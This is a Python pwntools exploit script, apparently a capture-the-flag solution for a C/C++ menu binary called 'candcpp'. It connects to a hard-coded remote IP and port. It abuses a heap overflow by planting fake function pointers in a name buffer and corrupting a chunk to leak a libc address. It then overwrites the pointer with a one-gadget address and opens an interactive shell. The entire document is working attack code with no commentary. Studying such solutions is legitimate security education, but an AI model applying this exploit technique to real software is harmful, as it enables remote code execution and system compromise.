from pwn import *

g_local=False
e=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
context.log_level='debug'
if g_local:
	sh = process('./candcpp')#, env={'LD_PRELOAD':'./libc-2.23.so'})
	gdb.attach(sh)
else:
	sh = remote('154.8.222.144', 9999)

MAIN_FUNC = 0x4009A0
LEAK_FUNC = 0x400E10
NAME_BUF = 0x602328

def init_name(name):
	sh.recvuntil("name: ")
	sh.sendline(name)
	sh.recvuntil(">> ")


def alloc(opt, data, size):
	sh.sendline(opt)
	sh.recvuntil("length of the string\n")
	sh.sendline(str(size))
	sh.recvuntil("the string\n")
	sh.sendline(data)
	sh.recvuntil(">> ")

def dealloc(opt, idx):
	sh.sendline(opt)
	sh.recvuntil("index of the string\n")
	sh.sendline(str(idx))
	sh.recvuntil(">> ")

malloc = lambda data, size : alloc("1", data, size)
new = lambda data, size : alloc("3", data, size)

free = lambda idx : dealloc("2", idx)
delete = lambda idx : dealloc("4", idx)

def puts(idx):
	sh.sendline("5")
	sh.recvuntil("index of the string\n")
	sh.sendline(str(idx))
	ret = sh.recvuntil("\n")
	sh.recvuntil(">> ")
	return ret[:-1]

init_name(p64(MAIN_FUNC) + p64(LEAK_FUNC)[:6])


#960 975
payload = cyclic(960) + p64(NAME_BUF)
payload = payload.ljust(975, 'A')
payload += p64(NAME_BUF + 8)
malloc(payload, 0x400)
free(0)
malloc('A', 1) #0
malloc('A' * 20, 20) #1

sh.sendline("4")
sh.recvuntil("index of the string\n")
sh.sendline(str(1))
sh.recvuntil("0x")
leak = sh.recvuntil("\n")
libc_addr = int(leak, 16) - e.symbols["puts"]

print hex(libc_addr)

init_name(p64(libc_addr + 0xf02a4)) #0x50

malloc(975 * 'A' + p64(NAME_BUF), 0x400)
free(2)
malloc('B', 1) #2
malloc('B' * 20, 20) #3

sh.sendline("4")
sh.recvuntil("index of the string\n")
sh.sendline(str(3))

sh.interactive()
